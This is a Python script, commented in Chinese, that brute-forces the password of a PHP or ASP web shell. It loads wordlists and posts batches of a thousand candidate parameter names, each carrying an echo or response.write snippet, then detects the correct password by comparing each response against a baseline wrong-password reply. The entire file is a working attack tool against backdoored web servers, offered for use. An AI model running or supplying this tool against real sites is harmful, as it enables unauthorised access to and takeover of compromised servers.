#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
from configparser import ConfigParser


class Bopo(object):
    def __init__(self, url, text_file, url_type, num):
        self.headers = {
            'Accept-Encoding': 'gzip, deflate, sdch',
            'Accept-Language': 'zh-CN,zh;q=0.8',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36'
                           ' (KHTML, like Gecko) Chrome/54.0.2840.98 Safari/537.36'),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded'}
        self.url = url
        # 字典文件目录 list 类型
        self.text_file = text_file
        # url 类型，并转换为小写
        self.url_type = url_type.lower()
        self.num = num
        # 获取 post 文本
        self.post_str = self.get_post_str()
        # 获取错误提交文本
        self.wrong_text = self.get_wrong_text()

    def get_post_str(self):
        """ 由 url_type 得到 post 需要填充的字符串 """
        if self.url_type == 'php':
            return 'echo "password is %s";'
        elif self.url_type == 'asp':
            return 'response.write("password:%s")'

    def get_wrong_text(self):
        """ 在错误的情况下得到的字符串，供下面爆破时候比对数据 """
        post_str = self.post_str % 'test_wrong_test'
        post_data = {'test_wrong_test': post_str}
        try:
            request = requests.post(url=self.url, headers=self.headers, data=post_data, timeout=30)
        except Exception as e:
            print("获取错误 response 失败，原因：%s " % e)
            exit(1)
        return request.text

    def read_text_file(self):
        """ 读取字典文件，放入指定大小的 list 里的迭代对象 """
        for file in self.text_file:
            with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                data = []

                for i in f:
                    data.append(i)

                    if len(data) == 1000:
                        yield data
                        data.clear()

                yield data

    def bopo(self):
        """ 对字典进行迭代，爆破 """
        text_data = self.read_text_file()
        n = 1

        for text in text_data:
            print('正在进行第 %s 组字典爆破！' % n)
            n = n + 1

            post_data = {}

            for i in text:
                i = i.strip('\n')
                post_data[i] = self.post_str % i

            try:
                request = requests.post(url=self.url, data=post_data, headers=self.headers, timeout=30)
                if request.status_code == requests.codes.ok and request.text != self.wrong_text:
                    print(request.text)
                    break
            except Exception as e:
                print("提交字典数据失败，原因：%s " % e)


if __name__ == "__main__":
    # 读取配置文件
    cf = ConfigParser()
    cf.read("conf")

    url = cf.get('main', 'url')
    url_type = cf.get('main', 'url_type')
    num = cf.getint('main', 'num')

    file_list = [file_name for _, file_name in cf.items('file')]

    # 实例化并运行
    bopo = Bopo(url=url, url_type=url_type, text_file=file_list, num=num)
    bopo.bopo()
